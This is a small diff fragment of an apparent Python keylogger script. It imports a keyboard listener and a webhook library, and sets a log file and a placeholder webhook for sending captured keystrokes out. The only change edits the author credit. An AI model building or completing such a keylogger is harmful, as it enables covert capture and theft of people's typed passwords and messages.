@@ -2,7 +2,7 @@ import os
 from pynput.keyboard import Key, Listener
 from dhooks import Webhook, File
 
-# made by ezen.fr & benja saltagueño
+# made by ezen.fr & benja saltagueño / M-Society TEAM
 
 LOG_FILE = "keylogs.txt"
 WEBHOOK_URL = "TU_WEBHOOK_AQUI"
